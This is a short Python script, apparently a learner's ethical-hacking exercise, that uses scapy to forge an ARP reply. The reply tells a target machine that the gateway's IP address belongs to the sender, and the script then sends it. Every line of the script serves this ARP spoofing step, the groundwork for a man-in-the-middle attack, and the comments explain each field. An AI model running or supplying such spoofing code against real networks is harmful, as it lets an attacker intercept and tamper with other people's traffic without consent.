#!/usr/bin/env python3
import scapy.all as scapy

## creating a packet, op is 2 to send a response not a request, pdst is target ip, hwdst is target mac, psrc is gateway ip.
packet = scapy.ARP(op=2, pdst="192.168.25.128", hwdst="00:15:5d:49:dc:a8", psrc="172.25.192.1")
## below code will send the packet, In brackets you have to specify the packet name created.
scapy.send(packet)

## Below Code Will Show Packet Contents
#print(packet.show())

## Below Code Will Show Summary
#print(packet.summary())